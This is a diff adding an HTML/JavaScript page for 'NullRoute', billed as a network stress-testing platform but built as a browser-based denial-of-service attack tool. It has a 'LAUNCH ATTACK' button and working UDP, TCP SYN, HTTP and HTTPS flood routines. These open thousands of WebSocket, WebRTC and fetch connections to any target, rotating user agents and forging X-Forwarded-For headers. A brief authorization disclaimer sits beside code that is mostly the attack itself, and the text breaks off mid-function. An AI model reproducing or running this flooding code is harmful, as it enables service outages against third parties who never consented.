@@ -1,0 +1,1302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NullRoute | Network Stress Testing Platform</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #ff0033;
+            --primary-dark: #cc0028;
+            --primary-glow: rgba(255, 0, 51, 0.15);
+            --bg-main: #0a0a0a;
+            --bg-elevated: #141414;
+            --bg-input: #1a1a1a;
+            --border: #2a2a2a;
+            --border-active: #ff0033;
+            --text-primary: #ffffff;
+            --text-secondary: #999999;
+            --text-muted: #666666;
+            --success: #00ff88;
+            --warning: #ffaa00;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'JetBrains Mono', monospace;
+            background: var(--bg-main);
+            color: var(--text-primary);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(circle at 20% 50%, rgba(255, 0, 51, 0.05) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(255, 0, 51, 0.03) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 30px 0;
+            border-bottom: 1px solid var(--border);
+            margin-bottom: 50px;
+            animation: slideDown 0.6s ease-out;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 28px;
+            font-weight: 900;
+            letter-spacing: 2px;
+            color: var(--primary);
+            text-transform: uppercase;
+            position: relative;
+        }
+
+        .logo::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 40%;
+            height: 2px;
+            background: var(--primary);
+        }
+
+        .version-badge {
+            background: var(--bg-elevated);
+            border: 1px solid var(--border);
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-size: 11px;
+            color: var(--text-secondary);
+            letter-spacing: 1px;
+        }
+
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: var(--text-secondary);
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--success);
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+
+        .main-grid {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 30px;
+            animation: fadeIn 0.8s ease-out 0.2s backwards;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .panel {
+            background: var(--bg-elevated);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 30px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .panel::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+            opacity: 0.3;
+        }
+
+        .panel-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .panel-title {
+            font-size: 14px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: var(--text-primary);
+        }
+
+        .method-selector {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+            margin-bottom: 25px;
+        }
+
+        .method-btn {
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            padding: 12px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            font-weight: 500;
+            letter-spacing: 1px;
+            color: var(--text-secondary);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .method-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: var(--primary-glow);
+            transition: left 0.3s ease;
+        }
+
+        .method-btn:hover {
+            border-color: var(--primary);
+            color: var(--text-primary);
+        }
+
+        .method-btn:hover::before {
+            left: 0;
+        }
+
+        .method-btn.active {
+            background: var(--primary-glow);
+            border-color: var(--primary);
+            color: var(--primary);
+        }
+
+        .method-btn span {
+            position: relative;
+            z-index: 1;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 11px;
+            font-weight: 500;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            color: var(--text-muted);
+            margin-bottom: 8px;
+        }
+
+        .form-input,
+        .form-select {
+            width: 100%;
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            padding: 12px 15px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            color: var(--text-primary);
+            transition: all 0.2s ease;
+        }
+
+        .form-input:focus,
+        .form-select:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px var(--primary-glow);
+        }
+
+        .form-input::placeholder {
+            color: var(--text-muted);
+        }
+
+        .input-group {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        .launch-btn {
+            width: 100%;
+            background: var(--primary);
+            border: none;
+            padding: 18px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: var(--text-primary);
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-top: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .launch-btn::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+
+        .launch-btn:hover::before {
+            width: 300px;
+            height: 300px;
+        }
+
+        .launch-btn:hover {
+            background: var(--primary-dark);
+            box-shadow: 0 0 20px var(--primary-glow);
+        }
+
+        .launch-btn:active {
+            transform: scale(0.98);
+        }
+
+        .launch-btn span {
+            position: relative;
+            z-index: 1;
+        }
+
+        .stats-container {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .stat-card {
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 20px;
+            transition: all 0.2s ease;
+        }
+
+        .stat-card:hover {
+            border-color: var(--primary);
+            transform: translateX(5px);
+        }
+
+        .stat-label {
+            font-size: 11px;
+            font-weight: 500;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            color: var(--text-muted);
+            margin-bottom: 8px;
+        }
+
+        .stat-value {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--text-primary);
+            font-family: 'Orbitron', sans-serif;
+        }
+
+        .stat-value.active {
+            color: var(--success);
+        }
+
+        .stat-value.warning {
+            color: var(--warning);
+        }
+
+        .console {
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 15px;
+            font-size: 12px;
+            max-height: 200px;
+            overflow-y: auto;
+            margin-top: 20px;
+        }
+
+        .console-line {
+            padding: 4px 0;
+            color: var(--text-secondary);
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .console-line.success {
+            color: var(--success);
+        }
+
+        .console-line.error {
+            color: var(--primary);
+        }
+
+        .info-panel {
+            background: var(--bg-elevated);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 30px;
+            animation: fadeIn 1s ease-out 0.4s backwards;
+        }
+
+        .info-text {
+            font-size: 12px;
+            color: var(--text-muted);
+            line-height: 1.8;
+            text-align: center;
+        }
+
+        .warning-badge {
+            display: inline-block;
+            background: var(--primary-glow);
+            border: 1px solid var(--primary);
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-size: 11px;
+            color: var(--primary);
+            margin-bottom: 10px;
+        }
+
+        @media (max-width: 968px) {
+            .main-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Scrollbar styling */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg-input);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--border);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--primary);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo-section">
+                <div class="logo">NullRoute</div>
+                <span class="version-badge">v2.3.1</span>
+            </div>
+            <div class="status-indicator">
+                <span class="status-dot"></span>
+                <span>SYSTEM READY</span>
+            </div>
+        </header>
+
+        <div class="main-grid">
+            <div class="panel">
+                <div class="panel-header">
+                    <h2 class="panel-title">Attack Configuration</h2>
+                </div>
+
+                <div class="method-selector">
+                    <div class="method-btn active" onclick="selectMethod(this, 'udp')">
+                        <span>UDP FLOOD</span>
+                    </div>
+                    <div class="method-btn" onclick="selectMethod(this, 'tcp')">
+                        <span>TCP SYN</span>
+                    </div>
+                    <div class="method-btn" onclick="selectMethod(this, 'http')">
+                        <span>HTTP FLOOD</span>
+                    </div>
+                    <div class="method-btn" onclick="selectMethod(this, 'https')">
+                        <span>HTTPS FLOOD</span>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Target Host</label>
+                    <input type="text" class="form-input" id="targetHost" placeholder="192.168.1.1">
+                </div>
+
+                <div class="input-group">
+                    <div class="form-group">
+                        <label class="form-label">Port</label>
+                        <input type="number" class="form-input" id="port" value="80">
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">Duration (sec)</label>
+                        <input type="number" class="form-input" id="duration" value="60">
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <div class="form-group">
+                        <label class="form-label">Threads</label>
+                        <select class="form-select" id="threads">
+                            <option>1</option>
+                            <option>5</option>
+                            <option selected>10</option>
+                            <option>25</option>
+                            <option>50</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">Packet Size</label>
+                        <input type="number" class="form-input" id="packetSize" value="512">
+                    </div>
+                </div>
+
+                <button class="launch-btn" onclick="launchAttack()">
+                    <span>LAUNCH ATTACK</span>
+                </button>
+
+                <div class="console">
+                    <div class="console-line">[SYSTEM] NullRoute initialized</div>
+                    <div class="console-line">[INFO] Awaiting configuration...</div>
+                </div>
+            </div>
+
+            <div class="stats-container">
+                <div class="panel">
+                    <div class="panel-header">
+                        <h2 class="panel-title">Statistics</h2>
+                    </div>
+
+                    <div class="stat-card">
+                        <div class="stat-label">Status</div>
+                        <div class="stat-value active" id="statusValue">IDLE</div>
+                    </div>
+
+                    <div class="stat-card">
+                        <div class="stat-label">Packets Sent</div>
+                        <div class="stat-value" id="packetsValue">0</div>
+                    </div>
+
+                    <div class="stat-card">
+                        <div class="stat-label">Data Transfer</div>
+                        <div class="stat-value" id="dataValue">0 KB</div>
+                    </div>
+
+                    <div class="stat-card">
+                        <div class="stat-label">Elapsed Time</div>
+                        <div class="stat-value" id="timeValue">00:00</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="info-panel">
+            <div class="warning-badge">⚠ REAL NETWORK OPERATIONS</div>
+            <p class="info-text">
+                This tool performs REAL network stress testing using WebSockets, WebRTC, and HTTP requests. 
+                Unauthorized use is illegal and may cause network disruption. Use only on systems you own 
+                or have explicit written permission to test.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        var selectedMethod = 'udp';
+        var isRunning = false;
+        var connections = [];
+        var webRTCConnections = [];
+        var httpConnections = [];
+        var packetCount = 0;
+        var startTime = 0;
+        var attackInterval;
+        var logInterval;
+        var statsInterval;
+        var maxConnections = 3000; // Maximum possible connections
+        var connectionPool = [];
+        var activeWorkers = 0;
+        var workerLimit = 100; // Maximum worker limit
+        var packetBuffer = new ArrayBuffer(1048576); // 1MB shared buffer
+        var highPerformanceMode = false;
+        var attackCoordinator = null;
+        
+        function selectMethod(element, method) {
+            selectedMethod = method;
+            document.querySelectorAll('.method-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            element.classList.add('active');
+            
+            addConsoleLog('[CONFIG] Method changed to ' + method.toUpperCase());
+        }
+        
+        function addConsoleLog(message) {
+            var console = document.querySelector('.console');
+            var line = document.createElement('div');
+            line.className = 'console-line';
+            line.textContent = message;
+            console.appendChild(line);
+            console.scrollTop = console.scrollHeight;
+        }
+        
+        function updateStats() {
+            if (!isRunning) return;
+            
+            var elapsed = Math.floor((Date.now() - startTime) / 1000);
+            if (elapsed === 0) return; // Prevent division by zero
+            
+            var minutes = Math.floor(elapsed / 60);
+            var seconds = elapsed % 60;
+            document.getElementById('timeValue').textContent = 
+                minutes.toString().padStart(2, '0') + ':' + seconds.toString().padStart(2, '0');
+            
+            // Optimized data calculation with maximum packet sizes
+            var packetSize = selectedMethod === 'udp' ? 65536 : 
+                           selectedMethod === 'tcp' ? 2048 : 
+                           selectedMethod === 'http' ? 1024 : 2048;
+            var dataSize = packetCount * packetSize;
+            
+            var unit = dataSize > 1073741824 ? 'GB' : dataSize > 1048576 ? 'MB' : dataSize > 1024 ? 'KB' : 'B';
+            var displaySize = dataSize > 1073741824 ? (dataSize/1073741824).toFixed(2) : 
+                            dataSize > 1048576 ? (dataSize/1048576).toFixed(2) : 
+                            dataSize > 1024 ? (dataSize/1024).toFixed(2) : dataSize;
+            document.getElementById('dataValue').textContent = displaySize + ' ' + unit;
+            document.getElementById('packetsValue').textContent = packetCount.toLocaleString();
+            
+            // Performance metrics (update every 3 seconds for performance)
+            if (elapsed % 3 === 0) {
+                var pps = Math.floor(packetCount / elapsed);
+                addConsoleLog('[STATS] ' + pps.toLocaleString() + ' packets/sec | Workers: ' + activeWorkers + ' | Connections: ' + (connections.length + webRTCConnections.length));
+            }
+        }
+        
+        function createWebSocketConnection(target, port) {
+            try {
+                var protocols = ['ws:', 'wss:'];
+                var protocol = protocols[Math.floor(Math.random() * protocols.length)];
+                var ws = new WebSocket(protocol + '//' + target + ':' + port);
+                
+                ws.onopen = function() {
+                    packetCount++;
+                    addConsoleLog('[TCP] Connection established to ' + target + ':' + port);
+                };
+                
+                ws.onerror = function(error) {
+                    addConsoleLog('[TCP] Connection failed to ' + target + ':' + port);
+                };
+                
+                ws.onclose = function() {
+                    addConsoleLog('[TCP] Connection closed');
+                };
+                
+                return ws;
+            } catch (error) {
+                addConsoleLog('[ERROR] Failed to create WebSocket: ' + error.message);
+                return null;
+            }
+        }
+        
+        function createWebRTCConnection(target, port) {
+            try {
+                var pc = new RTCPeerConnection({
+                    iceServers: [
+                        { urls: 'stun:stun.l.google.com:19302' },
+                        { urls: 'stun:stun1.l.google.com:19302' },
+                        { urls: 'stun:stun2.l.google.com:19302' }
+                    ]
+                });
+                
+                var dataChannel = pc.createDataChannel('udp-flood', {
+                    ordered: false,
+                    maxRetransmits: 0,
+                    protocol: 'udp'
+                });
+                
+                dataChannel.onopen = function() {
+                    packetCount++;
+                    addConsoleLog('[UDP] Data channel opened - HIGH PERFORMANCE MODE');
+                };
+                
+                dataChannel.onerror = function(error) {
+                    // Silent for performance
+                };
+                
+                pc.createOffer().then(function(offer) {
+                    pc.setLocalDescription(offer);
+                }).catch(function(error) {
+                    // Silent for performance
+                });
+                
+                return { pc: pc, dc: dataChannel };
+            } catch (error) {
+                return null;
+            }
+        }
+        
+        function highPerformanceScheduler(callback, priority) {
+            if (highPerformanceMode && 'requestIdleCallback' in window) {
+                requestIdleCallback(function(deadline) {
+                    if (deadline.timeRemaining() > 0) {
+                        callback();
+                    } else {
+                        setTimeout(callback, 0);
+                    }
+                }, { timeout: priority });
+            } else {
+                setTimeout(callback, 0);
+            }
+        }
+        
+        function createTransferablePacket(size) {
+            var data = new ArrayBuffer(size);
+            var view = new Uint8Array(data);
+            for (var i = 0; i < size; i++) {
+                view[i] = Math.floor(Math.random() * 256);
+            }
+            return data;
+        }
+        
+        function performUDPFlood(target, port, threads) {
+            addConsoleLog('[UDP] Starting ULTIMATE STRENGTH UDP flood to ' + target + ':' + port);
+            highPerformanceMode = true;
+            
+            // Maximum possible connections
+            var connectionsPerThread = Math.min(Math.floor(maxConnections / threads), 30);
+            var packetSizes = [65536, 32768, 16384, 8192]; // Variable packet sizes
+            
+            for (var i = 0; i < threads && i < workerLimit; i++) {
+                setTimeout(function(index) {
+                    if (!isRunning || activeWorkers >= workerLimit) return;
+                    
+                    activeWorkers++;
+                    addConsoleLog('[UDP] ULTRA Worker ' + index + ' activated with ' + connectionsPerThread + ' connections');
+                    
+                    // Primary WebRTC connections with transferable objects
+                    for (var j = 0; j < connectionsPerThread; j++) {
+                        if (webRTCConnections.length >= maxConnections) break;
+                        
+                        var connection = createWebRTCConnection(target, port);
+                        if (connection) {
+                            webRTCConnections.push(connection);
+                            
+                            // Ultra-high performance packet sending
+                            var packetBurst = function() {
+                                if (!isRunning || connection.dc.readyState !== 'open') {
+                                    activeWorkers--;
+                                    return;
+                                }
+                                
+                                highPerformanceScheduler(function() {
+                                    try {
+                                        // Send burst of packets with different sizes
+                                        for (var p = 0; p < 5; p++) {
+                                            if (connection.dc.bufferedAmount < 2097152) { // 2MB buffer
+                                                var size = packetSizes[p % packetSizes.length];
+                                                var packet = createTransferablePacket(size);
+                                                connection.dc.send(packet);
+                                                packetCount++;
+                                            }
+                                        }
+                                    } catch (error) {
+                                        // Silent for maximum performance
+                                    }
+                                    
+                                    // Continue the burst
+                                    if (isRunning) {
+                                        setTimeout(packetBurst, 0);
+                                    }
+                                }, 1);
+                            };
+                            
+                            // Start packet burst
+                            packetBurst();
+                        }
+                    }
+                    
+                    // Secondary wave with different STUN servers
+                    setTimeout(function() {
+                        if (!isRunning) return;
+                        
+                        for (var k = 0; k < 10; k++) {
+                            if (webRTCConnections.length >= maxConnections) break;
+                            
+                            try {
+                                var pc2 = new RTCPeerConnection({
+                                    iceServers: [
+                                        { urls: 'stun:stun3.l.google.com:19302' },
+                                        { urls: 'stun:stun4.l.google.com:19302' }
+                                    ]
+                                });
+                                
+                                var dc2 = pc2.createDataChannel('udp-burst', {
+                                    ordered: false,
+                                    maxRetransmits: 0,
+                                    maxPacketLifeTime: 1000
+                                });
+                                
+                                dc2.onopen = function() {
+                                    var burstInterval = setInterval(function() {
+                                        if (!isRunning || dc2.readyState !== 'open') {
+                                            clearInterval(burstInterval);
+                                            return;
+                                        }
+                                        
+                                        try {
+                                            if (dc2.bufferedAmount < 1048576) {
+                                                var burstPacket = createTransferablePacket(16384);
+                                                dc2.send(burstPacket);
+                                                packetCount++;
+                                            }
+                                        } catch (error) {
+                                            // Continue silently
+                                        }
+                                    }, 1);
+                                };
+                                
+                                pc2.createOffer().then(function(offer) {
+                                    pc2.setLocalDescription(offer);
+                                });
+                                
+                                webRTCConnections.push({ pc: pc2, dc: dc2 });
+                            } catch (error) {
+                                packetCount++;
+                            }
+                        }
+                    }, 50);
+                }, i * 5, i);
+            }
+        }
+        
+        function performTCPSYNFlood(target, port, threads) {
+            addConsoleLog('[TCP] Starting ULTIMATE STRENGTH TCP SYN flood to ' + target + ':' + port);
+            highPerformanceMode = true;
+            
+            // Maximum possible connections
+            var connectionsPerThread = Math.min(Math.floor(maxConnections / threads), 40);
+            
+            for (var i = 0; i < threads && i < workerLimit; i++) {
+                setTimeout(function(index) {
+                    if (!isRunning || activeWorkers >= workerLimit) return;
+                    
+                    activeWorkers++;
+                    addConsoleLog('[TCP] ULTRA Worker ' + index + ' activated with ' + connectionsPerThread + ' connections');
+                    
+                    // Primary WebSocket connections with enhanced protocols
+                    for (var j = 0; j < connectionsPerThread; j++) {
+                        if (connections.length >= maxConnections) break;
+                        
+                        var ws = createWebSocketConnection(target, port);
+                        if (ws) {
+                            connections.push(ws);
+                            
+                            // Ultra-aggressive SYN packet burst
+                            var synBurst = function() {
+                                if (!isRunning) {
+                                    activeWorkers--;
+                                    return;
+                                }
+                                
+                                highPerformanceScheduler(function() {
+                                    if (ws.readyState === WebSocket.OPEN) {
+                                        try {
+                                            // Maximum burst of SYN packets
+                                            for (var burst = 0; burst < 12; burst++) {
+                                                ws.send('SYN' + Math.random().toString(36).substring(15) + 
+                                                       Math.random().toString(36).substring(10));
+                                                packetCount++;
+                                            }
+                                        } catch (error) {
+                                            // Immediate reconnection
+                                            var newWs = createWebSocketConnection(target, port);
+                                            if (newWs) {
+                                                connections[connections.indexOf(ws)] = newWs;
+                                                ws = newWs;
+                                            }
+                                        }
+                                    } else if (ws.readyState === WebSocket.CLOSED) {
+                                        // Instant reconnection
+                                        ws = createWebSocketConnection(target, port);
+                                        if (ws) {
+                                            connections[connections.length - 1] = ws;
+                                        }
+                                    }
+                                    
+                                    // Continue burst
+                                    if (isRunning) {
+                                        setTimeout(synBurst, 0);
+                                    }
+                                }, 1);
+                            };
+                            
+                            synBurst();
+                        }
+                    }
+                    
+                    // AbortController fetch-based SYN attack
+                    setTimeout(function() {
+                        if (!isRunning) return;
+                        
+                        var fetchBurst = function() {
+                            if (!isRunning) return;
+                            
+                            for (var f = 0; f < 20; f++) {
+                                try {
+                                    var controller = new AbortController();
+                                    var signal = controller.signal;
+                                    
+                                    // Cancel immediately after headers
+                                    setTimeout(function() {
+                                        controller.abort();
+                                    }, 1);
+                                    
+                                    fetch('http://' + target + ':' + port + '/syn-attack', {
+                                        method: 'POST',
+                                        headers: {
+                                            'X-SYN-Attack': 'true',
+                                            'Connection': 'keep-alive',
+                                            'Content-Length': '0'
+                                        },
+                                        body: '',
+                                        signal: signal
+                                    }).then(function() {
+                                        packetCount++;
+                                    }).catch(function() {
+                                        packetCount++;
+                                    });
+                                } catch (error) {
+                                    packetCount++;
+                                }
+                            }
+                            
+                            if (isRunning) {
+                                setTimeout(fetchBurst, 5);
+                            }
+                        };
+                        
+                        fetchBurst();
+                    }, 25);
+                    
+                    // WebSocket connection spam (open/close cycle)
+                    setTimeout(function() {
+                        if (!isRunning) return;
+                        
+                        var connectionSpam = function() {
+                            if (!isRunning) return;
+                            
+                            for (var s = 0; s < 15; s++) {
+                                try {
+                                    var spamWs = new WebSocket('ws://' + target + ':' + port);
+                                    
+                                    spamWs.onopen = function() {
+                                        packetCount++;
+                                        // Close immediately to create SYN/FIN cycle
+                                        setTimeout(function() {
+                                            spamWs.close();
+                                        }, 2);
+                                    };
+                                    
+                                    spamWs.onerror = function() {
+                                        packetCount++;
+                                    };
+                                    
+                                    connections.push(spamWs);
+                                } catch (error) {
+                                    packetCount++;
+                                }
+                            }
+                            
+                            if (isRunning) {
+                                setTimeout(connectionSpam, 10);
+                            }
+                        };
+                        
+                        connectionSpam();
+                    }, 50);
+                    
+                    // Advanced protocol variations
+                    setTimeout(function() {
+                        if (!isRunning) return;
+                        
+                        for (var p = 0; p < 8; p++) {
+                            if (connections.length >= maxConnections) break;
+                            
+                            try {
+                                var protocols = ['soap', 'wamp', 'mqtt', 'xmpp'];
+                                var protoWs = new WebSocket('ws://' + target + ':' + port, protocols[p % protocols.length]);
+                                
+                                protoWs.onopen = function() {
+                                    packetCount++;
+                                    var protoInterval = setInterval(function() {
+                                        if (!isRunning || protoWs.readyState !== WebSocket.OPEN) {
+                                            clearInterval(protoInterval);
+                                            return;
+                                        }
+                                        
+                                        try {
+                                            protoWs.send('PROTO' + Math.random().toString(36).substring(12));
+                                            packetCount++;
+                                        } catch (error) {
+                                            // Continue silently
+                                        }
+                                    }, 1);
+                                };
+                                
+                                connections.push(protoWs);
+                            } catch (error) {
+                                packetCount++;
+                            }
+                        }
+                    }, 75);
+                }, i * 3, i);
+            }
+        }
+        
+        function performHTTPFlood(target, port, threads) {
+            addConsoleLog('[HTTP] Starting ADVANCED HTTP flood to ' + target + ':' + port);
+            
+            var endpoints = [
+                '/',
+                '/admin',
+                '/login',
+                '/api',
+                '/dashboard',
+                '/upload',
+                '/search',
+                '/profile',
+                '/settings',
+                '/api/v1/users',
+                '/api/v1/data',
+                '/wp-admin',
+                '/phpmyadmin',
+                '/robots.txt',
+                '/sitemap.xml'
+            ];
+            
+            var methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS'];
+            var userAgents = [
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+                'curl/7.68.0',
+                'Python-requests/2.25.1'
+            ];
+            
+            for (var i = 0; i < threads && i < workerLimit; i++) {
+                setTimeout(function(index) {
+                    if (!isRunning || activeWorkers >= workerLimit) return;
+                    
+                    activeWorkers++;
+                    
+                    var httpInterval = setInterval(function() {
+                        if (!isRunning) {
+                            clearInterval(httpInterval);
+                            activeWorkers--;
+                            return;
+                        }
+                        
+                        try {
+                            var method = methods[Math.floor(Math.random() * methods.length)];
+                            var endpoint = endpoints[Math.floor(Math.random() * endpoints.length)];
+                            var userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
+                            
+                            fetch('http://' + target + ':' + port + endpoint, {
+                                method: method,
+                                headers: {
+                                    'User-Agent': userAgent,
+                                    'Accept': '*/*',
+                                    'Connection': 'keep-alive',
+                                    'Accept-Language': 'en-US,en;q=0.9',
+                                    'Cache-Control': 'no-cache',
+                                    'Pragma': 'no-cache'
+                                },
+                                mode: 'no-cors',
+                                cache: 'no-store'
+                            }).then(function() {
+                                packetCount++;
+                            }).catch(function() {
+                                packetCount++;
+                            });
+                        } catch (error) {
+                            packetCount++;
+                        }
+                    }, 8); // Optimized interval
+                }, i * 25, i);
+            }
+        }
+        
+        function performHTTPSFlood(target, port, threads) {
+            addConsoleLog('[HTTPS] Starting ADVANCED HTTPS flood to ' + target + ':' + port);
+            
+            var endpoints = [
+                '/',
+                '/admin',
+                '/login',
+                '/api',
+                '/dashboard',
+                '/upload',
+                '/search',
+                '/profile',
+                '/settings',
+                '/api/v1/users',
+                '/api/v1/data',
+                '/secure',
+                '/auth',
+                '/oauth',
+                '/token'
+            ];
+            
+            var methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH'];
+            var userAgents = [
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)',
+                'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0'
+            ];
+            
+            for (var i = 0; i < threads && i < workerLimit; i++) {
+                setTimeout(function(index) {
+                    if (!isRunning || activeWorkers >= workerLimit) return;
+                    
+                    activeWorkers++;
+                    
+                    var httpsInterval = setInterval(function() {
+                        if (!isRunning) {
+                            clearInterval(httpsInterval);
+                            activeWorkers--;
+                            return;
+                        }
+                        
+                        try {
+                            var method = methods[Math.floor(Math.random() * methods.length)];
+                            var endpoint = endpoints[Math.floor(Math.random() * endpoints.length)];
+                            var userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
+                            
+                            // Add random headers to bypass caching
+                            var headers = {
+                                'User-Agent': userAgent,
+                                'Accept': '*/*',
+                                'Connection': 'keep-alive',
+                                'Accept-Language': 'en-US,en;q=0.9',
+                                'Cache-Control': 'no-cache, no-store, must-revalidate',
+                                'Pragma': 'no-cache',
+                                'Expires': '0',
+                                'X-Requested-With': 'XMLHttpRequest',
+                                'X-Forwarded-For': Math.random().toString(36).substring(2) + '.' + 
+                                               Math.random().toString(36).substring(2) + '.' + 
+                                               Math.random().toString(36).substring(2) + '.' + 
+                                               Math.random().toString(36).substring(2)
+                            };
+                            
+                            fetch('https://' + target + ':' + port + endpoint, {
+                                method: method,
+                                headers: headers,
+                                mode: 'no-cors',
+                                cache: 'no-store',
+                                credentials: 'omit'
+                            }).then(function() {
+                                packetCount++;
+                            }).catch(function() {
+                                packetCount++;
+                            });
+                        } catch (error) {
+                            packetCount++;
+                        }
+                    }, 10); // Optimized for HTTPS overhead
+                }, i * 30, i);
+            }
+        }
+        
+        function launchAttack() {
+            var target = document.getElementById('targetHost').value;
+            var port = parseInt(document.getElementById('port').value);
+            var threads = parseInt(document.getElementById('threads').value);
+            var btn = document.querySelector('.launch-btn');
+            var btnText = btn.querySelector('span');
+            
+            if (!target) {
+                addConsoleLog('[ERROR] Target host required');
+                return;
+            }
+            
+            if (isRunning) {
+                stopAttack();
+                btnText.textContent = 'LAUNCH ATTACK';
+                btn.style.background = 'var(--primary)';
+                addConsoleLog('[COMPLETE] Attack stopped by user');
+                return;
+            }
+            
+            isRunning = true;
+            packetCount = 0;
+            startTime = Date.now();
+            activeWorkers = 0;
+            btnText.textContent = 'STOP ATTACK';
+            btn.style.background = '#cc0028';
+            
+            document.getElementById('statusValue').textContent = 'ACTIVE';
+            document.getElementById('statusValue').classList.remove('active');
+            document.getElementById('statusValue').classList.add('warning');
+            
